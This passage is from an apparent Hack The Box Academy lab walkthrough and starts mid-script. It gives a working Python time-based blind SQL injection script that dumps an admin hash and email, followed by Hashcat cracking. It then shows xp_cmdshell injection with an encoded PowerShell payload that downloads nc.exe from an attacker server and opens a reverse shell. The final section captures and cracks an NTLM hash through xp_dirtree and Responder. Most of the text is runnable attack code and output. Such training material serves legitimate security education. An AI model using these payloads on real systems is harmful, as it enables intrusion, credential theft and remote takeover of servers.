from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://STMIP/index.php",
        cookies = {"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

#databaseNameLength = dumpNumber("LEN(DB_NAME())") #3
#databaseName = dumpString("DB_NAME()", databaseNameLength) # d4y

databaseName = "d4y"

#numberOfTables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';")
numberOfTables = 15

#for i in range(numberOfTables):
#    tableNameLength = dumpNumber(f"SELECT LEN(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
#    print(tableNameLength)
#    tableName = dumpString(f"SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", tableNameLength)
#    print(tableName)

tableName = "users"

#numberOfRows = dumpNumber("SELECT COUNT(*) FROM users")
numberOfRows = 1

row1Length = dumpNumber("SELECT TOP 1 LEN(password) FROM users")
print(dumpString("SELECT TOP 1 password FROM users", row1Length))
```

After running the script, students will attain the hash `8315744aa239bdba3464d255af507bc9`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-myfhpevdfp]─[~]
└──╼ [★]$ python3 oracle.py

8315744aa239bdba3464d255af507bc9
```

Additionally, students need to dump the email address of the admin as it is needed for a subsequent question:

Code: python

```python
row1Length = dumpNumber("SELECT TOP 1 LEN(email) FROM users")
print(dumpString("SELECT TOP 1 email FROM users", row1Length))
```

Code: python

```python
import requests, time, sys
from urllib.parse import quote

DELAY = 3

def oracle(q):
    start = time.time()
    payload = quote(f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}';--")
    r = requests.get(
        "http://STMIP/index.php",
        cookies = {"TrackingId": payload}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

#databaseNameLength = dumpNumber("LEN(DB_NAME())") #3
#databaseName = dumpString("DB_NAME()", databaseNameLength) # d4y

databaseName = "d4y"

#numberOfTables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{databaseName}';")
numberOfTables = 15

#for i in range(numberOfTables):
#    tableNameLength = dumpNumber(f"SELECT LEN(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
#    print(tableNameLength)
#    tableName = dumpString(f"SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG='{databaseName}' ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", tableNameLength)
#    print(tableName)

tableName = "users"

#numberOfRows = dumpNumber("SELECT COUNT(*) FROM users")
numberOfRows = 1

row1Length = dumpNumber("SELECT TOP 1 LEN(email) FROM users")
print(dumpString("SELECT TOP 1 email FROM users", row1Length))
```

After running the script, students will know that the email address of the admin is `admin@d4y.at`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-urkcwspsa0]─[~]
└──╼ [★]$ python3 oracle.py

admin@d4y.at
```

Answer: `8315744aa239bdba3464d255af507bc9`

# Skills Assessment

## Question 2

### "Crack it."

With the previously dumped hash `8315744aa239bdba3464d255af507bc9`, students need to crack it with `Hashcat` utilizing hashmode 0, to attain the plaintext `eclipse1`:

Code: shell

```shell
hashcat -m 0 -w 3 -O '8315744aa239bdba3464d255af507bc9' /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-ve3mpgjrh9]─[~]
└──╼ [★]$ hashcat -m 0 -w 3 -O '8315744aa239bdba3464d255af507bc9' /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

8315744aa239bdba3464d255af507bc9:eclipse1

<SNIP>
```

Answer: `eclipse1`

# Skills Assessment

## Question 3

### "Log in as admin, and exploit a second blind SQL injection vulnerability to gain RCE on the server. What is the contents of 'C:\\flag.txt'?"

Using the previously attained credentials `admin@d4y.at:eclipse1`, students need to login using them:

![[HTB Solutions/CWEE/z. images/9d8a397bf6fec47c01be722031eefcd0_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/1cf3a4fbc083566bcaa296e69a6943c1_MD5.jpg]]

Subsequently, students will notice that they can create new posts, thus, they need to click on "Create Post":

![[HTB Solutions/CWEE/z. images/c073524cfc630fd6197abaef2e2b00c5_MD5.jpg]]

After fuzzing all the fields, students will discover that the captcha answer field is vulnerable to SQL injection:

![[HTB Solutions/CWEE/z. images/727363da114aa1d31b2721c4aad49dc5_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/edd56c264ed83a4b4ea811bb7781ade5_MD5.jpg]]

Thus, students need to intercept the request being sent to understand how the form fields are being passed:

![[HTB Solutions/CWEE/z. images/4f3d079c26731218ca2a5f47e849365c_MD5.jpg]]

There are five form fields being passed in the body:

Code: http

```http
title=doesNotMatter&message=doesNotMatter&picture=&captchaAnswer=%275&captchaId=67
```

![[HTB Solutions/CWEE/z. images/d5515fc154f48ca691593e46e5afccb7_MD5.jpg]]

Students can make the response delay for 10 seconds using the `WAITFOR DELAY` statement:

Code: sql

```sql
';IF(1=1) WAITFOR DELAY '0:0:10';--
```

The payload needs to be URL-encoded:

Code: shell

```shell
printf %s "';IF(1=1) WAITFOR DELAY '0:0:10';--" | jq -Rr @uri
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-ve3mpgjrh9]─[~]
└──╼ [★]$ printf %s "';IF(1=1) WAITFOR DELAY '0:0:10';--" | jq -Rr @uri

'%3BIF(1%3D1)%20WAITFOR%20DELAY%20'0%3A0%3A10'%3B--
```

With the attained payload, students will notice after sending it that the response delays for 10 seconds before being received:

![[HTB Solutions/CWEE/z. images/f272f0f8a8f284dde5165ac5205eaf15_MD5.jpg]]

Now that the vulnerability has been identified, to attain a reverse shell, students first need to start by enabling `Advanced Options`:

Code: sql

```sql
5';EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;--
```

Code: shell

```shell
printf %s "5';EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;--" | jq -rR @uri
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ printf %s "5';EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;--" | jq -rR @uri

5'%3BEXEC%20sp_configure%20'Show%20Advanced%20Options'%2C%20'1'%3BRECONFIGURE%3B--
```

When sending the payload, it is important to include the `PHPSESSID` cookie of the admin user (students need to use the cookie value they attain and not the one used in here, as it is generated and verified by the backend per-instance):

Code: shell

```shell
curl http://STMIP/new.php -H 'Cookie: PHPSESSID=l6gactt0gke7frodanrbdlb2fm' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=5'%3BEXEC%20sp_configure%20'Show%20Advanced%20Options'%2C%20'1'%3BRECONFIGURE%3B--"
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ curl http://10.129.78.235/new.php -H 'Cookie: PHPSESSID=l6gactt0gke7frodanrbdlb2fm' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=5'%3BEXEC%20sp_configure%20'Show%20Advanced%20Options'%2C%20'1'%3BRECONFIGURE%3B--"

Captcha answer is <b>incorrect</b>!
```

Then, students need to enable `xp_cmdshell`:

Code: sql

```sql
5';EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;--
```

The payload needs to be URL-encoded:

Code: shell

```shell
printf %s "5';EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;--" | jq -rR @uri
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ printf %s "5';EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;--" | jq -rR @uri

5'%3BEXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%3B%20RECONFIGURE%3B--
```

Subsequently, students need to send the payload with `cURL`:

Code: shell

```shell
curl http://STMIP/new.php -H 'Cookie: PHPSESSID=l6gactt0gke7frodanrbdlb2fm' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=5'%3BEXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%3B%20RECONFIGURE%3B--"
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ curl http://10.129.78.235/new.php -H 'Cookie: PHPSESSID=l6gactt0gke7frodanrbdlb2fm' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=5'%3BEXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%3B%20RECONFIGURE%3B--"

Captcha answer is <b>incorrect</b>!
```

Now, to attain a reverse shell, students need to use a `PowerShell` payload that will upload a Windows `netcat` binary to the target machine then initiate a reverse shell connection (students need to make sure that `PWNPO` specified for the web server is different from the one that `nc` is listening on):

Code: powershell

```powershell
(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
```

To encode the payload, students need to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) then Base64-encode it. Students can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual `PowerShell` one:

```
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-9o4uijujjg]─[~]
└──╼ [★]$ python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.14.187:9001/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 10.10.14.87 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADcAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANAAuADgANwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==
```

Additionally, students need to URL-encode the `PowerShell` payload along with the SQLi payload:

Code: shell

```shell
printf %s "5';EXEC xp_cmdshell 'powershell.exe -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADcAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANAAuADgANwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==';--" | jq -rR @uri
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-9o4uijujjg]─[~]
└──╼ [★]$ printf %s "5';EXEC xp_cmdshell 'powershell.exe -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADcAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANAAuADgANwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==';--" | jq -rR @uri

5'%3BEXEC%20xp_cmdshell%20'powershell.exe%20-exec%20bypass%20-enc%20KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADcAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANAAuADgANwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA%3D%3D'%3B--
```

Afterward, students need to download a compiled version of `nc` for Microsoft Windows from [GitHub](https://github.com/int0x33/nc.exe/raw/master/nc.exe):

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2022-12-26 14:28:13--  https://github.com/int0x33/nc.exe/raw/master/nc.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/int0x33/nc.exe/master/nc.exe [following]
--2022-12-26 14:28:13--  https://raw.githubusercontent.com/int0x33/nc.exe/master/nc.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38616 (38K) [application/octet-stream]
Saving to: ‘nc.exe’

nc.exe                                  100%[=============================================================================>]  37.71K  --.-KB/s    in 0.001s  

2022-12-26 14:28:13 (34.9 MB/s) - ‘nc.exe’ saved [38616/38616]
```

Then, students need to start a web server with Python using the port specified for the web server in the `PowerShell` payload (9001 in here):

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ python3 -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Then, students need to start an `nc` listener using the same port specified for it in the `PowerShell` payload (9002 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ nc -nvlp 9002

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
```

At last, students need to send the URL-encoded payload with `cURL`, abusing the blind SQLi vulnerability previously discovered in the captcha answer field:

Code: shell

```shell
curl http://STMIP/new.php -H 'Cookie: PHPSESSID=l6gactt0gke7frodanrbdlb2fm' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=5'%3BEXEC%20xp_cmdshell%20'powershell.exe%20-exec%20bypass%20-enc%20KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADcAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANAAuADgANwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA%3D%3D'%3B--"
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ curl http://10.129.78.235/new.php -H 'Cookie: PHPSESSID=l6gactt0gke7frodanrbdlb2fm' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer=5'%3BEXEC%20xp_cmdshell%20'powershell.exe%20-exec%20bypass%20-enc%20KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADcAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANAAuADgANwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA%3D%3D'%3B--"
```

When checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.78.235.
Ncat: Connection from 10.129.78.235:58723.
Microsoft Windows [Version 10.0.20348.1366]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

At last, students need to print out the contents of the flag file "flag.txt", which is under the `C:\` directory, attaining `b8946a2a6bf381b35d6669ded25a14a2`:

Code: cmd

```cmd
type C:\flag.txt
```

```
C:\Windows\system32>type C:\flag.txt

type C:\flag.txt
b8946a2a6bf381b35d6669ded25a14a2
```

Answer: `b8946a2a6bf381b35d6669ded25a14a2`

# Skills Assessment

## Question 4

### "Exploit either blind SQL injection vulnerability to capture Murat's NetNTLM hash, and crack it."

Students first need to start `Responder` on the `tun0` interface:

Code: shell

```shell
responder -I tun0
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]

<SNIP>
```

Subsequently, students need to coerce the SQL server into trying to access the SMB share `myshare` started by `Responder` to capture NTLM hashes:

Code: sql

```sql
'EXEC master..xp_dirtree '\\\\PWNIP\\myshare', 1, 1;--
```

Code: shell

```shell
printf %s "';EXEC master..xp_dirtree '\\\\PWNIP\\myshare', 1, 1;--" | jq -rR @uri
```

```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ printf %s "';EXEC master..xp_dirtree '\\\\10.10.14.187\\myshare', 1, 1;--" | jq -rR @uri

'%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.14.187%5Cmyshare'%2C%201%2C%201%3B--
```

Students need to send the URL-encoded payload with `cURL`, abusing the blind SQLi vulnerability previously discovered in the captcha answer field (or alternatively, the blind SQLi discovered in the `TrackingId` cookie), most importantly including the cookie `PHPSESSID` of the admin user:

```shell
curl http://STMIP/new.php -H 'Cookie: PHPSESSID=0g6g440ke9dqir64li01n839bg' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer='%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.14.187%5Cmyshare'%2C%201%2C%201%3B--"
```
```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ curl http://10.129.204.202/new.php -H 'Cookie: PHPSESSID=0g6g440ke9dqir64li01n839bg' -H 'Content-Type: application/x-www-form-urlencoded' -d "title=1&message=1&picture=&captchaId=26&captchaAnswer='%3BEXEC%20master..xp_dirtree%20'%5C%5C10.10.14.187%5Cmyshare'%2C%201%2C%201%3B--"

Captcha answer is <b>incorrect</b>!
```

When checking `Responder`, students will find the NTLMv2 hash of `Murat`:

```
[SMB] NTLMv2-SSP Client   : 10.129.204.202
[SMB] NTLMv2-SSP Username : SQL02\Murat
[SMB] NTLMv2-SSP Hash     : Murat::SQL02:1aae60eb0d3b685e:14E03157A9724D883F5864B96A4A214F:0101000000000000009E18DE1025D9010F865117901417C10000000002000800420039004700470001001E00570049004E002D0044004C0046005500340046003700560055003000450004003400570049004E002D0044004C004600550034004600370056005500300045002E0042003900470047002E004C004F00430041004C000300140042003900470047002E004C004F00430041004C000500140042003900470047002E004C004F00430041004C0007000800009E18DE1025D90106000400020000000800300030000000000000000000000000300000E42D57ABF923DD42A4A2DBAEB557CB3BA67676F0CA667B6D131273FF988854730A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380037000000000000000000
```

At last, students need to crack the hash with `Hashcat` utilizing hashmode 5600 to attain the cleartext password `jesus07`:

```shell
hashcat -m 5600 -w 3 -O 'Murat::SQL02:1aae60eb0d3b685e:14E03157A9724D883F5864B96A4A214F:0101000000000000009E18DE1025D9010F865117901417C10000000002000800420039004700470001001E00570049004E002D0044004C0046005500340046003700560055003000450004003400570049004E002D0044004C004600550034004600370056005500300045002E0042003900470047002E004C004F00430041004C000300140042003900470047002E004C004F00430041004C000500140042003900470047002E004C004F00430041004C0007000800009E18DE1025D90106000400020000000800300030000000000000000000000000300000E42D57ABF923DD42A4A2DBAEB557CB3BA67676F0CA667B6D131273FF988854730A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380037000000000000000000' /usr/share/wordlists/rockyou.txt
```
```
┌─[us-academy-2]─[10.10.14.187]─[htb-ac413848@htb-y5ijklxwxh]─[~]
└──╼ [★]$ hashcat -m 5600 -w 3 -O 'Murat::SQL02:1aae60eb0d3b685e:14E03157A9724D883F5864B96A4A214F:0101000000000000009E18DE1025D9010F865117901417C10000000002000800420039004700470001001E00570049004E002D0044004C0046005500340046003700560055003000450004003400570049004E002D0044004C004600550034004600370056005500300045002E0042003900470047002E004C004F00430041004C000300140042003900470047002E004C004F00430041004C000500140042003900470047002E004C004F00430041004C0007000800009E18DE1025D90106000400020000000800300030000000000000000000000000300000E42D57ABF923DD42A4A2DBAEB557CB3BA67676F0CA667B6D131273FF988854730A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380037000000000000000000' /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

MURAT::SQL02:1aae60eb0d3b685e:14e03157a9724d883f5864b96a4a214f:0101000000000000009e18de1025d9010f865117901417c10000000002000800420039004700470001001e00570049004e002d0044004c0046005500340046003700560055003000450004003400570049004e002d0044004c004600550034004600370056005500300045002e0042003900470047002e004c004f00430041004c000300140042003900470047002e004c004f00430041004c000500140042003900470047002e004c004f00430041004c0007000800009e18de1025d90106000400020000000800300030000000000000000000000000300000e42d57abf923dd42a4a2dbaeb557cb3ba67676f0ca667b6d131273ff988854730a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100380037000000000000000000:jesus07

<SNIP>
```

Answer: `jesus07`